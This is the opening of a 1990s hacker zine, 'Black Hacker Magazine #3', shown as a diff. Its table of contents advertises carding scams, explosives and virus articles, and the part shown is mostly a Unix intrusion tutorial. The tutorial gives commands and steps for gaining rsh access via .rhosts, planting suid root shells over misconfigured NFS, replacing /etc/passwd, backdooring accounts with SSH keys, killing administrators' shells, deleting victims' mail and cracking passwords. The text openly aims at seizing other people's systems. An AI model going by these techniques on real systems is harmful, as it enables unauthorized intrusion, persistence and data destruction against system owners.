@@ -1,0 +1,2612 @@
+·                                                         .______
+:            _/\_.     _/\_.     _/\_____  _/\_______ _/\_|     /
+¦           _\_  |_____\_  |_____\____   \_\_  .____/_\_  |  __/
+|:.        /     l_   \_   l    \_   .    \_   l    \_         \_
+|:::.     /______.     |___.     |___|     |___.     |____|     |
+|:::::.       wBr`-----'   `-----'   `-----'   `-----'    `-----'
+`------------------------------------ -- -.______ - -- ------------------.
+       _/\_.___  _/\_____  _/\_______ _/\_|     /_/\_____  _/\_____ ·::::|
+      _\_  |   \_\____   \_\_  .____/_\_  |  __/_\_  __  \_\_____  \  ·::|
+     /          \_   .    \_   l    \_         \_    \___/\_   _/ _/    ·|
+<---/______|     |___|     |___.     |____|     |____.     |___|    \_---'
+           `-----'   `-----'   `-----'    `-----'    `-----'-u!`-----'
+                       -= BLACK HACKER MAGAZINE #3 =-
+
+
+----------------------------
+Preface to the ascii version
+----------------------------
+Welcome to BHM#3. This zine is primarily distributed in a PC-VERSION with
+reader, fonts music etc. All this has been removed, and your experience
+will not be as cool ;) Well, for you unix/amiga/mac dudes, or pc dudes
+with a crappy machine, here goes ... BHM#3!
+
+
+Contens:
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+                   1_1 : Disclaimer
+                   1_2 : Welcome!
+                   2_1 : Unix Hacking For Newbiez
+                   2_2 : The Rar Bug
+                   2_3 : Social Engineering
+                   2_4 : A Way To Hack Unix
+                   2_5 : Hackers vs. Warez d00dz
+                   2_6 : Wombat: A Pcboard Batch Virus
+                   2_7 : How To Get Root On a Linux
+                   3_1 : Visa/Creditcard Scam
+                   3_2 : Credit Card Scam #2
+                   3_3 : How To Obtain A Visa
+                   3_4 : Phone Scam
+                   3_5 : Hackers Guide To INTERNET OUTDIALS.
+                   3_6 : Visa Carding Made Easy
+                   3_7 : How A Pyramid Scheme Works
+                   4_1 : Easy Explosives
+                   4_2 : Newbie Flooding (IRC)
+                   4_3 : Fake Emails
+                   4_4 : Finger Trick
+                   4_5 : Trojanize EXE/COM Files
+                   4_6 : Norwegian: Telenor Suger
+                   4_7 : Norwegian: Hordaland PBX List!
+                   4_8 : Ending Note
+
+
+^DiSCLAiMER^
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+BHM is distributed and meant to be used for educational purposes only. The
+creators of this product do not in any way advocate the implementation of
+the information contained herein and as such will not be held responsible
+for any use or misuse thereof.
+
+The creators of this product will not be liable for any special, incidental,
+consequential, indirect or similar damages due to loss of data or any other
+reason. The person using the software bears all risk and consequence by
+misusing this product and the information it contains. 
+
+YOUR USE OF THIS SOFTWARE INDICATES THAT YOU HAVE READ AND AGREE
+TO THESE AND OTHER TERMS INCLUDED IN THIS DOCUMENTATION FILE.
+
+Since some of the information this product contains can be misused
+in a harmful manner the creators are not liable for any damage 
+caused by misuse of this product and the information it withholds.
+If any of the information here within is misused you are doing it 
+at your own risk! If you are not sure about this, or if you do not
+accept this, then do not use this product.
+
+Black Hacker Magazine is not recommended for children, telco workers,
+government employees, any law enforcement agency employees, busters,
+warez d00dz, etc. If you are one of the above, then please press ESC twice,
+then ENTER, and delete all files in current directory.
+
+Some of the trademarks mentioned in this product appear
+for identification purposes only.
+
+THIS PRODUCT IS SUPPLIED "AS IS". THE CREATORS HEREBY
+DISCLAIM ALL WARRANTIES RELATING TO THIS SOFTWARE AND ITS
+DOCUMENTATION FILE, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED
+TO DAMAGE TO HARDWARE, SOFTWARE AND/OR DATA FROM USE OF THIS
+PRODUCT. IN NO EVENT WILL THE CREATORS OF THIS PRODUCT BE LIABLE
+TO YOU OR ANY OTHER PARTY FOR ANY DAMAGES.
+
+DUE TO THE NATURE OF EVOLVING PROGRAMMING AND THE VARIOUS
+HARDWARE AND SOFTWARE ENVIRONMENTS IN WHICH THIS SOFTWARE MAY
+BE USED, IT IS UNDERSTOOD THAT OCCASIONAL "BUGS" OR UNFITNESS
+MAY ARISE. THE USER SHOULD ALWAYS TEST THIS SOFTWARE THOROUGHLY
+WITH NON-CRITICAL DATA BEFORE RELYING ON IT.
+
+AGAIN; BY USING THIS PRODUCT YOU ACCEPT THE FULL DISCLAIMER AS STATED ABOVE,
+       AND AGREE TO ALL TERMS INCLUDED IN IT!
+
+                                           - Keep hacking strong, Codeblaster
+
+
+Welcome!
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+  Welcome to Black Hacker Magazine - third issue!
+
+  I think I can say, without exaggerating, that this mag is getting better
+  and better for each time... It was hard getting it better than BHM#2, but
+  I think we did it! :) We are also growing, we have aprox 5 new members
+  since last time, and we're hoping on more!
+
+  This issue contains an informative & interesting mixture of bbs hacking,
+  unix hacking, other internet hints, pascal sources, phreaking and CC
+  scams! I'm sure you'll find this mag good, or at least interesting! ;)
+
+  We're changing our name, from The Black Hackers (TBH) to No Shit! (NS!).
+  This is mainly because TBH was a lame name all from the start, and just
+  meant as a 'cover-up' for me and TNSe when we were hacking lame bbs's.
+  We thought 2 secs about the lame name, and never dreamed of being a
+  hpa group like this! :).. Well, our new name is No Shit!, so you'll
+  probably find BHM#4 under the name of NS!-BHM4.ZIP ... 
+
+  Just let me get one thing straight, the name of this magazine is BHM, as
+  in Black Hacker Magazine, not as in Black Hackers Magazine or The Black
+  Hackers Magazine etc. But Black Hacker (no S) Magazine. So, stop making
+  ansi's saying TBH Magazine ;) and mail me some saying BHM instead!
+
+  We need more members to keep this mag a quality mag. Writers of any kind
+  are welcome, either you're into hacking/phreaking/anarchy or just plain
+  writing! (We don't always write those 'how-to' texts you know, an example
+  of this is the 'Hackers vs. Warez d00dz' article in this mag.)  So if you
+  wanna take part in the success of TBH, then consider joining now, by
+  mailing us at:
+                        blackhackers@hotmail.com
+
+  Greets goes out to all the op's at #hack who just love +k and +b, and
+  the dudes at #2600 whoze a bit nicer ;). Also, to everyone on #Food,
+  #Phreak, #Hacker, #Coding and #Pascal! Love yah dudes! =)
+
+                                         - Keep Hacking Strong, Codeblaster!
+
+
+Unix Hacking For Newbiez
+%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%/%
+
+ ----                                                                  ----
+                       U N I X   f o r   n e w b i e z
+
+                                   b y
+
+
+                                    M.
+
+ ----                                                                  ----
+
+ DISCLAIMER!
+
+ This phile is a hacker's introduction to UNIX. If you are a government or
+ telco worker, skip it. If you are familiar with UNIX, skip it. If you are
+ a system administrator, skip it. If you hack for destroying systems or
+ for espionage, skip it! The intention of this text is to give fundamental
+ knownledge about UNIX-systems to all those whose interst in computers
+ goes beyond programming, and newsgroup-chatting. This is an introduction
+ to the artwork of surfin' the net, not with a silly web-browser, but with
+ total control over the computer-wavez. Have Phun!
+
+ ----                                                                  ----
+
+ INTRODUCTION!
+
+ Getting into UNIX and network services is easy, but anyone who want to
+ know enough to contol systems, must not only have a fair knownledge of
+ UNIX, but master it! To do that takes time and hard work. Until today
+ the only way of gaing such knownledge has been to read books and study
+ hard. But not anymore. Here I give you an introduction to UNIX
+ and network services, from a hackers point of view.
+
+ - Ok, enough gossipze, get to the point !!
+
+ OK, I will, I will.
+
+
+ IN THE BEGINNING IT WAS...
+
+ Unix is the oldest operating system still in use today. It was made as a
+ contrary to Multics in the late 60's. From the late 70's there were to
+ major "styles" of UNIX, the System V from Bell Labs, and the BSD Unix,
+ from Berkeley. Today there are lots of variants of UNIX as each of the
+ different vendors make their own, and in addition there are some
+ "independent" operating systems. Each of the different unix-versions
+ today have their own history, derived from either System V or BSD. And
+ more important: Each of the versions today have their own system software
+ with their own bugs! This is important to know, because it is the bugs
+ you are going to use to enter a system.
+
+ So an average hacker has to know about the different systems. Here is a
+ short list over the most usual UNIX' today, which vendor they come from,
+ and on which processors they run. (today == early 1997)
+
+ OS              Vendor                  Processor       Derived From
+
+ IRIX            Silicon Graphics        MIPS Rxx00      System V
+ ULTRIX          Digital (old)           MIPS R2/3000    BSD
+ Digital UNIX    Digital (new)                           System V (?)
+ AIX             IBM                                     BSD
+ HP-UX           Hewlett Packard         PA-RISC         System V
+ SCO UNIX        SCO                     Intel x86
+ FreeBSD         (independent)           Intel x86       BSD
+ Linux           (independent)           Intel x86       BSD
+ SunOS           Sun (old)               Sparc           BSD
+ Solaris         Sun (new)               Sparc / x86     System V
+ UNICOS          Cray
+
+
+ Why do you need to know all this? Because you will learn that you can
+ recognize different OS's via the net, and when you learn about new bugs,
+ they will alwayz be for a specific OS. (OS == Operating System) You also
+ need to know the System V / BSD difference, because this traditional
+ difference has lead into differences in where you can find specific
+ system-files, different commands, different options to commands, and s0-0n.
+
+
+ AND NOW INTO IT.
+
+ UNIX is a multitasking, multiuser operating system. This means that
+ several users can be logged in at once and execute commands on the
+ system. Just like a BBS! Of course there are restrictions on what normal
+ users can do. Files have ownership and permissions, saying who owns the
+ file, and who can read from and write to it. On every unix-system there
+ is a system administrator account. The name of this user is always
+ 'root'. r00t can do everything on the system, remove or edit eny file,
+ mount and unmount file systemz, shut down the machine etc. If you have
+ the root password on a unix box, you usually have just as much control of
+ it, as the people who are there, even if the box is on the other side of
+ the world. This means, of course, that the goal of every hack is to
+ become r00t, only then have you got control over the machine.
+
+
+ BUT FIRST..
+
+ we nee to learn some basics. The UNIX filesystem starts at / and expand
+ downwards as a directory hierarchy. Anyone familiar with D0S should
+ recognize this. The differenze is that several disks can be mounted on
+ the same logical filesystem. So, ie /usr/bin can be on an other disk than
+ /home .  There are basic commands for filelisting and manipulation. Here
+ is a brief list with their lamey D0S equivalents:
+
+ UNIX            DOS
+
+ ls              dir
+ rm              del
+ mkdir           md
+ rmdir           rd
+ cat             type
+ cd              cd
+ mv              move, ren
+ echo            echo
+
+ To every such command you can give a list of options. Useful options for
+ the above commands are:
+
+ ls -l   list files with ownership and permissionz.
+ ls -al  also list files beginning with '.', not listed per default.
+ ls -ld  list the permissions on a directory instead of its contents
+ rm -f   force flag - overrides incorrect permissonz etc.
+ rm -rf  remove all files in all subdirectories
+         (rm -rf /  will remove all files on the system, and thus bring
+          the machine down for good.  Don't do thiz!!)
+ cat >foo takes input from the standard input and cat it to the file 'foo'
+
+ The last line brings in another concept with the shellz in UNIX. The
+ shell is the program that executes the commands you give. Like
+ COMMAND.COM in DOS. Common shellz today are bash and tcsh. These are mere
+ programming languages in their own, and can be used to execute scripts.
+ The shellz and the unix kernel provide a feature called pipes. These let
+ you send the ouput from the program as the input to the next program.
+ This is done using the '|'. You can also send the output to a file using
+ '>', or take the input from a file or your shell '<'. This feature has
+ lead to implementations of filters that format your output. Here are some
+ of them:
+
+ grep    - show only the lines with a special word
+ cut     - show i.e. only the first 3 chars of the lines
+ more    - break the output into pages.
+ less    - more and less is more or less the same. (less is more than more)
+ sort    - sort the output
+ uniq    - take awau equal lines
+
+ For instance: you want to see a long list of files with perms. You type:
+
+ ls -al | less
+
+ You want to find the password entry of root, and save it in a file.
+
+ cat /etc/passwd | grep root >./yankeedoodledoo
+
+ The usefulness of the pipesystem is incredible. You just need some
+ practice.  The observant reader may have noticed that the length of the
+ last filename was longer than 8 chars. In unix there are no restrictions
+ on filename lenghts. The directoy . is always the directory it is in, the
+ directory .. is always it's parent. This means for istance that 'cd ..'
+ is a valid command while 'cd..' is not (unlike DOS). Before we look at
+ file permissionz, I want to mension the command 'man'. 'man' gives you
+ the online manual page for the command you want to try. This is useful
+ for newbiez, but also for old gurus who can't remember the correct
+ options.  Ie.
+
+ man ls  - gives you the manual page for ls.
+
+
+ PERMISSIONS AND OWNERSHIP.
+
+ These features are central in the protection system of unix. If you use
+ 'ls -l' a typical directory-entry looks like this:
+
+ -rw-r--r--  1 root      deamon           158 Nov 6  00:40 chatscript
+
+ In addition to file name, date and time, we here have the owner (root),
+ the group (deamon), the number of hardlinks, and the permissions. The
+ permissions are read (r), write (w) and execute (x) for owner (first),
+ other members of the group (second) and all other people (third).
+ So the file 'chatscript' can by read by everyone, but only written to by
+ 'root'. The first char in the perms can be 'd' for directory, 'l' for
+ link and '-' for file.  It can also be other things you don't have to
+ worry about.  You can change the permissions with the 'chmod' command.
+ Using 'chmod a+w chatscript' would make chatscript writable for everyone.
+ r00t can use the 'chown' command to change ownership on a file. Ie.
+ 'chown mao.commies chatscript' would make the file owned by mao in the
+ group commies. There is also a special bit called suid-bit which have
+ made a lot of usable bugs in unix. The suid-bit, when set, makes the
+ program run with the permissions of the owner of the file, even when run
+ by anybody else. This is particularly used by system-files, run as users,
+ which get r00t permissionz when run, to have special privileges. Ex:
+
+ -r-sr-sr-x  1 root    bin      164060 Aug 23  1995 sendmail*
+
+ This program will, when run by user 'mao', have permissions as 'root' -
+ it can do everything. Sendmail is a very big and complex program and has
+ been exploited by hackers for years and years. For instance the infamous
+ 'Internet Worm' released by Robert Morris in 1988 was partly based on a
+ bug/hole in sendmail. As you may understand, executable programs that are
+ suid root are the absolute best and easiest way to become emperor over a
+ system. Bugs in these programs are found often, and usually posted on
+ security newsgroups / mailinglists on the Internet together with
+ bugfixes. Any hacker can just scan those groups, find a bug which suits,
+ and use it. As we can see, the above version of sendmail is rather
+ old, which means we can probably find a bug in it which we can use,
+ to become r00t.
+
+ Another possibility with suid programs, is the ability to leave a suid
+ shell as a hole in the system. Consider thiz:
+
+ -r-sr-sr-x  1 root    bin      299649 Aug 10  1995 bash*
+
+ Any user can run this shell, and will effectively become r00t upon so.
+ This file can be hidden anywhere in the filesystem.
+
+ Another interesting property of permissions is that you don't have to have
+ write permission on a file to rm or mv it. It's enough with write
+ permission to the directory in which it resides. If for instance you see
+ the permissionz on the directory /etc is this:
+
+ drwxr-xrwx  2 root   root        1024 Aug 03  1995 etc/
+
+ this means that you can remove the file /etc/passwd. Doing so will make
+ the system useless as nobody (not even root) can log in. After doing so,
+ the system will have do be reinstalled. It would be more interesting to
+ add another entry on the password file. This can also be done, by using
+ the feature that a new file inherits the permissions and ownerships of an
+ old file when it's mv'ed to the same name. So if the /etc directry has
+ permissions as above, anyone can make a copy of the password file,
+ remove the password of 'root', mv it onto the old 'passwd' file, and log
+ in as 'root' without a password. (And then set a new root-password so
+ that the old sysadms loose control...)
+
+ To conclude: Permissions and ownership is very important for a hacker to
+ understand, especially the implications of the suid-bit on system
+ programs. You've got an introduction here. Practice on your nearest
+ unix-box, read and learn.
+
+
+ NORMAL FILES AND DIRECTORIES
+
+ It's useful to have a small overview over a the normal systems directory
+ structure. This offcourze varies from system to system, but is normally
+ very similiar on systems with the same operating system.  Let's take a
+
+ M:~> ls /
+ bin/                            root/
+ boot/                           sbin/
+ dev/                            tmp/
+ etc/                            usr/
+ home/                           var/
+ lib/                            vmlinuz
+ lost+found/
+ mnt/
+ proc/
+
+ the directory structure of my machine, M, reflects that it is a linux
+ machine. More about linux later. The first directory, bin/ contains
+ binaries for common programs like ls, mv, bash, etc. boot/ is a directory
+ for linux boot images. dev/ is the device directory with all external
+ devices which you'll learn more about later. etc/ is the directory for
+ all the system configurations files. home/ contains the homedirectories
+ for the users. root/ is the homedirectory for root. sbin/ is a binary
+ directory for sysadmin tools. tmp/ is a world-writable directory for
+ temporary files. usr/ is the installation directory for user programs,
+ and var/ is the dir for variables, i.e. logs.  You will soon recognize
+ /etc as one of the most important directories on any system, despite its
+ odd name. Here you can find the password file /etc/passwd, all
+ configurationz files for network services, and so on. Secondly, the
+ binary dirs are important. Remember, if you have write permission to any
+ of these, you can sneak in a trojan in any program that root might run.
+ If he does, the system can be yours. The file vmlinuz is the boot image
+ for the system, containing the system kernel. On other OS's this file is
+ commonly called 'unix' which very much descibe it's contents. Do not
+ remove this file. The system will go down and not come up again. This can
+ also be said about many files in the /etc dir. If you for instance remove
+ /etc/lilo.conf (on linux) the system will not be able to boot, because
+ the lilo (linux loader) not will be able to know what to do.
+
+
+ PROCESSES.
+
+ Any UNIX-hacker also needs to understand the concept of processes. On a
+ UNIX system every program that runs, has it's own process. This process
+ is allocated memory-space and a time-slice. It is not allowed to read or
+ write anything outside it's own memory space. If it does so, it will be
+ terminated by the operating system with the message:
+
+ Segmentation Fault
+
+ which is similar to the "General Protection Fault", Windows users may
+ have encountered. The process has a user id, and a group id. It is only
+ allowed to access files with the corresponding id. Processes run by
+ 'root' can access anything. To get a list over processes you use the 'ps'
+ command. Just 'ps' gives you the list of your processes, while 'ps -ef'
+ (System V) and 'ps -aux' (BSD) give you a comprehensive listing of all
+ processes running on the system. On such a listing you will notice a
+ considerable amount of processes run by r00t. These are for the most
+ deamons - system programs run to take care of system tasks - network
+ communication for instance. It is possible to send a signal to a process,
+ using the 'kill' command. There are a great variety of signals, usually
+ summarized in the file /etc/signals.  The most common are HUP, TERM and
+ KILL. HUP (Hangup) will respawn a deamon. Processes which are not a
+ deamon will usually terminate on this signal. TERM is a signal to the
+ process to tidy up and die (terminate). KILL is really not signaled to
+ the process, but to the kernel. This signal will cause the kernel to
+ remove the process and kill it. Ofcourse a user can only signal his own
+ processes, and r00t can signal any process on the system. Consider this
+ example. You have become r00t on a system, but are afraid that the
+ sysadms are watching you. With the command
+
+ ps -aux | grep root | grep bash   (assuming BSD - system)
+
+ you find out the process number of the shellz r00t are running. You then
+ determine which shell is your own. (Remember, you are also running a
+ shell as r00t!) If there were two shells and the PID (Process ID) of the
+ other's was 21345, you throw him out with:
+
+ kill -KILL 21345
+
+ Shellz like bash will not terminate on TERM, so you have to KILL them. If
+ you are killing a users process, say netscape, the user will get the message:
+
+ netscape: Killed.
+
+ He will then start to wonder who killed his netscape. A smarter move
+ would be to signal the process with another signal, like this:
+
+ kill -SIGXCPU 22345   or
+ kill -SIGBUS  22345   or
+ kill -SIGSEGV 22345   .
+
+ which will produce the following results accordingly:
+
+ netscape: CPU time exceeded.
+ netscape: Bus Error.
+ netscape: Segmentation Fault.
+
+ As the signals is the mechanism used by the kernel to signal
+ these occurences, it is impossible for the user to tell the difference
+ between a real SegFault, and one gererated by 'root'.
+
+ Another thing I will discuss here, is the login processes. When a user
+ logz in, the program /bin/login is executed. When the user has entered
+ his name and password, he get his shell, which is specifyed in the
+ password file. (Users can change shell with the 'chsh' command.) His
+ login name is then written to the files /var/adm/utmp and /var/adm/wtmp.
+ These files are important because at all times, they tell who are logged
+ in. The user can see who are logged in by using the commands 'who' and 'w'.
+
+ M:/bin# who
+ root    tty1    Dec 19 18:16
+
+ Here we can see that root is logged in, and is using the tty1. tty means
+ text-terminal, and is a standard unix device. So, what's a device?  Well,
+ a device looks like a file in the file system but it is not. Everything
+ attached to the machine is devices. Mouses, modems, serial lines,
+ harddisks, etc etc.  'root' can read from, and write to devices using the
+ > and < and /dev/device.  In the above case, if you do:
+
+ M:/bin# cat >/dev/tty1
+ You're machine is under siege, sucker!
+ ^C
+
+ will send the message to root.
+
+ the command:
+
+ M:/bin# cat </dev/tty1
+
+ will result in everything root types will end up in your tty and not in
+ his. Very irritating. But remember: On most systems, only r00t can do this.
+ Another thing you might want to do is to have a l00k at which processes
+ consume the most CPU-time on the system. The program 'top' is made for
+ this, and usually gives you a hint about heavy processes like
+ Alec-Muffet's 'crack-pwc'. More about password cracking later. There are
+ also some more user-friendly programs to communicate with other users on
+ the system. Among these are 'talk', 'finger', 'ytalk', 'write', 'wall',
+ 'rwall', 'rwho' etc etc.  Which brings us over to:
+
+
+ NETWORK SERVICES.
+
+ In these over-Internet-hype ages, most people probably know about the
+ most important network-services on unix. I will summarize the most
+ important stuff, and quickly get into the more interesting.
+
+ Every machine on the Internet has it's own IP-address in numbers. Each
+ machine can be contacted using TCP on 65536 different ports. On
+ unix-systems the ports below 1024 are restricted to the system. The ones
+ above, can be used by normal users. The ports are usually summarized in
+ the file /etc/services. Here is a short summary of some important network
+ services:
+
+ SERVICE                 COMMAND NAME / SERVER
+
+ Remote login            telnet / telnetd
+                         rsh    / rshd
+                         on     / rexd
+                         ssh    / sshd
+ File Transmission       ftp    / ftpd
+ Web                     ...    / httpd
+ Finger                  finger / finger
+ Mail                    ...    / sendmail
+ Name service            ...    / bind
+ NIS / YP                ...    / ypbind, ypserv
+ NFS                     mount  / nfsd, mountd
+
+
+ etc etc.  To fin out which ports runs servicez on a machine, use the
+ program 'strobe' availible on the net. The results of strobing can be
+ very interesting, and often leads to finding holes.
+
+ Regarding network services the hackers interest is often to find a way
+ to get into a system without having an account. This can be tricky, but
+ fortunately, most of the services that are needed to tie the Internet
+ together are complex, which means that they have many potential holes,
+ and are difficult to administrate. In the following list I have tried to
+ present stuff without getting too detailed. The actual exploration is
+ left as an exercise to the reader.
+
+ - Rexd
+
+ This is an old deamon that allows a user to run a command on the system
+ without password authentication. Thus, anyone can run a command on the
+ system. This can be mailing out the password file, opening a user account
+ via rsh or other things. For details, read the man page of 'on'.
+
+ - Rsh
+
+ This is a mechanism that let users run a command on a machine on the net
+ with authentication. The user makes a '.rhosts' file on his home
+ directory including entries for the hosts he trusts: the hosts who can
+ run commands as him on this system. The letter '+' is a wildcard. I.e. if
+ the user mao on the machine palace.peking.net has the following entries
+ in his .rhosts:
+
+ palace.shanghai.net  mao
+ palace.hongkong.net  mao
+
+ it means that his user on these other machines can run commands as him on
+ palace.peking.net without providing his password.
+
+ palace.shanghai.net:~> rsh palace.peking.net
+ palace.peking.net:~>
+
+ 'root' on shanghai and hongkong can also run programs as him on peking,
+ because r00t can become 'mao' using the command 'su - mao'  (Remember:
+ r00t can do anything!) If he had written:
+
+ + mao
+
+ anyone in the world could run commands as him on  peking, because they
+ could just make a 'mao' user on their own system, and then go ahead. To
+ further complicate this there is a systemwide .rhosts file called
+ /etc/hosts.equiv.  If there's a '+ +' in this file, anyone in the world
+ can run commands as any user (excluding root) on the system. As you may
+ understand, the rsh mecanism is very good for obtaining account on other
+ systems. If you can execute commands on a system, you can easily obtain
+ an interactive shell by executing:  echo "+ +" >.rhosts and then log in
+ using rsh. It is also very good for going further when you already have
+ become r00t on one system. All you have to do is checking all the users
+ .rhosts files (i.e. by using the 'find' command) and then get user
+ accounts on other machines using the 'su' and 'rsh' commands.
+
+ -Telnet
+
+ is the standard way of logging in remotely. It doesn't present any
+ obvious security problems, because a user always have to give his
+ password ... eh wait...  password ??  Yes.  If you have r00t privileges
+ on a box you can use an ethernet sniffer program to sniff the password,
+ because the password is transmitted in clear text. Anyone who is r00t on
+ a box (or has a PC without unix) can sniff passwords from sessions on the
+ local network. Very useful. Another usefullness with telnet is that
+ when you telnet to a machine, you usually get a g00d hint of what kind of
+ system it is, and thereby you can find useable bugs on it.
+
+ very.evil.hacker.com:~> telnet poor.victim.net
+
+ Linux 1.3.75 (poor) (ttyP0)
+
+
+ poor login:
+
+ aha a linux box...   (if you have a user, the system version can be found
+ with the command 'uname -a')
+
+
+ -Sendmail
+
+ As previous mentioned sendmail is a suid program both for local and
+ remote use. It therefore presents major security problems. You can
+ determine which sendmail version a box is running by telnetting to it's
+ mail-port:
+
+ very.evil.hacker.com:~> telnet major.trouble.onthe.net smtpd
+
+ 220-major Sendmail 8.6.12/8.6.9 ready at Thu, 19 Feb 1997 00:00:05 -0600
+ 220 ESMPT spoken here
+
+ aha! an old Sendmail version... By using bugs in old sendmail versions
+ one can gain user and r00t access on a box. Another interesting feature
+ by telnetting to the mailport is the ability to check certain users on
+ the box:
+
+ expn root
+ 250 John Major <johnX07
+
+ interesting way to find out who's in charge of the machine!
+
+ -ssh
+
+ is a new remote login standard that ensures encryption on the net, and
+ public key authorization. Very cool, and very secure. Except for the fact
+ that if you compile your own private key, using 'ssh-keygen', and put the
+ public key in your victim's ~/.ssh/authorized-keys you have found the
+ perfect backdoor to come back into the system. Remember that the name of
+ the key is only a name. If you want to leave a hole on mao's account,
+ call your key maoX07
+ Use 'man ssh' for more info about ssh.
+
+ -ftp and www
+
+ is not so interesting for the hacker. There have been reported some bugs
+ in the httpd's around. You can find more info about this on the web.
+
+ -Domain Name Service (DNS)
+
+ is the service that maps a name over to an ip - adress. Whenever a
+ machine tries to adress lame.sucker.onthe.net, the local name-server is
+ called to map the name to an ip-adress, say 134.56.12.89. If the local
+ name-server hasn't got the answer, the caller is given the address of the
+ name-server futher up in the hierarchy. This means that if you have
+ control over the name-server you can effecively get control over the
+ machines trusting it, by giving yourself a false name. You do this by
+ manipulating the files under /etc/named.  An interesting prospect about
+ this is that the nameservers are hierarchial, which means that there is a
+ top-server, which maps the names .com, .net, .org, .gov, .mil etc.  If you
+ get control over this machine, you have the whole Internet between your
+ thumb and index finger.
+
+ -Name Information Service (NIS / YP)
+
+ is applied by large systems with many users, to ease the control of
+ password information, host information and other. This is interesting,
+ because if you hack the 'ypmaster' you get control over the others by
+ making new accounts, or changing the passwords of existing accounts.
+ Another feature is that most yp-running systems is misconfigured in
+ such a way that it is possible for any user to retrieve the password file
+ of the system using the 'ypx' program, which is availible on the net.
+ Passwords can than be cracked, and whopee...
+
+ -Network File System (NFS)
+
+ is a major achievement in network technology, and is widely used in
+ unix-systems. File systems can be exported, and mounted on remote
+ machines using the 'mount' command, and then looks like a normal file
+ system to the remote user. Filesystems can be mounted read-only or
+ read-write. Unfortunately (to the sysadms hehe) NFS is very often
+ misconfigured. The filesystems exports are controlled in the file
+ /etc/exports, which demands a very strict format. Misunderstandments here
+ often lead to filesystems being exported rw to everyone. So then
+ you can mount it on your own box, and put a "+ +" in any users .rhosts,
+ for instance. Note that only the owner of the file can manipulate it, and
+ the owner is recognized by UID number, not name. So before manipulating
+ the remote files, you have to make an account on your local system with
+ the same uid as the owner of the remote files. Normally exportz is not
+ valid for r00t, so r00t can not manipulate root's files on the remote
+ system. But sometimes the filesystems are exported with root-capability.
+ Then it's easy: copy a shell to the exported disk, make it owned by r00t, and
+ chmod it to be suid. If you can run a command on the remote machine -
+ you're root on it!
+
+ A command that can be very useful is the 'df' - diskfree. This also gives
+ information about any nfs-mounted filesystems. The command 'showmount'
+ tells you which hosts mount from this host, and 'showmount -e' tells
+ which filesystems are exported from this host.
+
+ evil.com:~> showmount -e looser.mil
+ /var/mail (rw) (everyone)
+ /home (rw) (everyone)
+
+ Let'z delete their mail!
+
+
+ -Finger
+
+ The fingerd has traditionally contained bugs, but is now regarded as
+ secure. Anyhow, fingering might be interesting, because you can se who is
+ logged on the system:
+
+ finger X07
+ [gates.microsoft.com]
+ LoginNameTty  Idle  Login Time  Office   Office Phone
+ bill Bill Gates1   Feb 10 01:56
+ wifeSome day I wil  2          Feb 10 02:01
+
+ and you can find more information about them by fingering one person in
+ particular:
+
+ finger wifeX07
+ [gates.microsoft.com]
+ Login: wife                             Name: Some day I will have a wife
+ Directory: /home/gates/wife             Shell: /bin/bash
+ On since Thu Feb 10 02:01 (GMT -05) on tty2  12 seconds idle
+ No mail
+ Plan:
+
+ as you can see we can find out lots of interesting stuff. As every hacker
+ should know, gathering information is half the job!
+
+
+ Learning to use network services to the common good for the hacker
+ community is only a matter of practice. The network is the gateway to
+ the computer. Have Phun!
+
+
+ X WINDOWS
+
+ Off course the UNIX-world got it'z own window-system. The X-Windows system
+ permits different window-managers, that the users can configure to suit
+ themselves. Thus, X-Windows can be configured to look like any other
+ Window system. The m0st important feature with X-Windows is the ability
+ to send windows from applications across the network. Which display an X
+ application will connect to is determined by an environment variable in
+ the shell. For instance:
+
+ yeltsin.moscow.su:~> xhost +
+ yeltsin.moscow.su:~> rsh clinton.whitehouse.gov
+ clinton.whitehouse.gov:~> export DISPLAY=yeltsin.moscow.su:0.0
+ clinton.whitehouse.gov:~> xterm &
+
+ will start an xterm (window with terminal) on Clinton's machine, but the
+ window will appear on Yeltsin's machine. The & sign tells the shell to
+ start the process without waiting for the process to end. The 'xhost +'
+ told Yeltsin's machine that his display is opened for any window to
+ connect. This is dangerous. He should have written 'xhost
+ +clinton.whitehouse.gov', because Clinton can now discover what's
+ happening with the 'ps' command, and see that Yeltsin has opened his
+ display. He can now
+
+ clinton.whitehouse.gov:~> import -display yeltsin.moscow.su:0.0 -window
+ root spy.jpg
+
+ and on the resulting image, he can view the secret files Yeltsin was
+ working on in the background. There are various reasons why displays
+ should not be opened to everyone. The command above is just one
+ possibility. Despite this, people seem to think it'z easier just to type
+ xhost +, and thus open their hearts to everyone. It's important to
+ recognize the fact that to use the many holes one can find in the X
+ system, you normally have to be on an X system yourselves.
+
+
+
+ PASSWORDS AND PASSWORD CRACKING
+
+ We will now turn over till some more practical matter. As you may have
+ understood, every unix-system uses password authentication for its users.
+ On normal systems the password file is stored in /etc/passwd. On systems
+ using NIS/YP, the password filed can be retrieved by the command 'ypcat
+ passwd'. On some newer systems, the password is shadowed and can not be
+ view by the user. Bad luck! However, on most systems the password file is
+ availible. The password is encrypted using a DES one-way encryption with
+ a 12 bit salt. This means that the password is never decrypted when
+ checked, but the entered password is encrypted using the same salt and
+ algorithm, and then compared with the one in the password file. The
+ algorithm is considered secure. It is therefore not possible to crack a
+ password by breaking the algorithm. What IS possible anyhow - is to
+ utilize people's silliness. People often choose common words as
+ passwords, not speaking of using their phonenumber or birthdaydate.
+ Silly. What we have to to is to obtain a list of common english words (or
+ any other appropriate language), encrypt them with the different salts
+ and try them against the password file. Such a program, Crack, is readily
+ availible on the net. It even tries permutations of the users loginnames.
+ A session of Crack will take you a little week on a Pentium Pro 200 with
+ a password file with 1000 users, and a very big dictionary. Fortunately the
+ m0st common combinations are tried first, so you will have good chance of
+ a hit within a few hours. (Remember: The unix-password is only 8 chars.)
+
+ Sample from password file:
+
+ root:sPDumSuuJqYt6:0:0:The r00t of all Evil:/root:/bin/bash
